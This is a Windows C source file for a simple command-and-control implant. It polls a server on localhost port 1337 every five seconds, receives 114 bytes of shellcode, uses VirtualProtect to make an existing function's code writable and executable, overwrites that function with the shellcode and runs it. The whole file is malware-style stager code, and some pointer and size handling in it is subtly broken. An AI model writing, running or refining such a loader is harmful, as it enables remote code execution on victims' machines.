#include <stdio.h>
#include <memory.h>
#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <synchapi.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#pragma warning(disable:4996) 
#define EXPECTED_SHELLCODE_SIZE 114

void function1(void);
void function2(void);
int changeAddressSpacePermissions(void (*funcPtr1)(void), void (*funcPtr2)(void));

int swapFunctionWithShellCode(char remoteShellcode[EXPECTED_SHELLCODE_SIZE]) {

    //get function1 pointer
    void (*funcPtr1)(void);
    funcPtr1 = &function1;
    //get function2 pointer
    void (*funcPtr2)(void);
    funcPtr2 = &function1;

    //change permissions of function1's address space to allow writing to the instruction set.
    changeAddressSpacePermissions(funcPtr1, funcPtr2);

    puts("Calling function1");
    function1();

    char shellcode[EXPECTED_SHELLCODE_SIZE] = {};

    for (int i = 0; i < EXPECTED_SHELLCODE_SIZE; i++) {
        shellcode[i] = remoteShellcode[i];
    }

    //overwrite function1 instructions with shellcode
    memcpy(funcPtr1, shellcode, sizeof(shellcode) - 1);

    puts("Calling function1");
    //function1 instructions now should be shellcode, lets execute it
    function1();
    return 0;
}

void function1(void) {
    char message[] = "Function 1 is running, hurray!";
    printf("%s\n", message);
}

void function2(void) {}

int changeAddressSpacePermissions(void (*funcPtr1)(void), void (*funcPtr2)(void)) {
    //get address space size we need to modify
    size_t size = (&funcPtr2 - &funcPtr1);
    DWORD thingy = 0;
    //set function1 address space to execute/read/write.
    bool worked = VirtualProtect(funcPtr1, size, PAGE_EXECUTE_READWRITE, &thingy);

    return 0;
}

int sendC2Request(char* remoteShellcode) {
    WSADATA wsaData;
    SOCKET sock = INVALID_SOCKET;
    struct addrinfo* result = NULL,
        * ptr = NULL,
        hints;
    const char* sendbuf = "C2";
    char recvBuffer[EXPECTED_SHELLCODE_SIZE] = {};
    int iRecvResult;
    int recvBufferLen = EXPECTED_SHELLCODE_SIZE;

    iRecvResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iRecvResult != 0) {
        printf("WSAStartup failed with error: %d\n", iRecvResult);
        return 1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    iRecvResult = getaddrinfo("127.0.0.1", "1337", &hints, &result);
    if (iRecvResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iRecvResult);
        WSACleanup();
        return 1;
    }

    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

        sock = socket(ptr->ai_family, ptr->ai_socktype,
            ptr->ai_protocol);
        if (sock == INVALID_SOCKET) {
            printf("socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return 1;
        }

        iRecvResult = connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iRecvResult == SOCKET_ERROR) {
            closesocket(sock);
            sock = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (sock == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }

    iRecvResult = send(sock, sendbuf, (int)strlen(sendbuf), 0);
    if (iRecvResult == SOCKET_ERROR) {
        printf("send failed with error: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    printf("Bytes Sent: %ld\n", iRecvResult);

    iRecvResult = shutdown(sock, SD_SEND);
    if (iRecvResult == SOCKET_ERROR) {
        printf("shutdown failed with error: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    do {

        iRecvResult = recv(sock, recvBuffer, recvBufferLen, 0);

        if (iRecvResult > 0)
            printf("Bytes received: %d\n", iRecvResult);
        else if (iRecvResult == 0)
            printf("Connection closed\n");
        else
            printf("recv failed with error: %d\n", WSAGetLastError());

        for (int i = 0; i < EXPECTED_SHELLCODE_SIZE; i++) {
            remoteShellcode[i] = ((unsigned char)recvBuffer[i]);
        }

        if (remoteShellcode[0] == '\x32') {
            remoteShellcode[0] = remoteShellcode[0] - 1;
        }
        else if (remoteShellcode[0] == '\x33') {
            remoteShellcode[0] = remoteShellcode[0] - 2;
        }

        break;

    } while (iRecvResult > 0);

    // cleanup
    closesocket(sock);
    WSACleanup();

    return 0;
}


int main(void) {
    char remoteShellcode[EXPECTED_SHELLCODE_SIZE] = {};
    bool triggered = false;
    while (!triggered) {
        Sleep(5000);
        int responseCode = sendC2Request(remoteShellcode);

        if (responseCode == 0) {
            triggered = true;
        }

        function1();
    }

    swapFunctionWithShellCode(remoteShellcode);
    puts("C2 command ran! Exiting!");
}
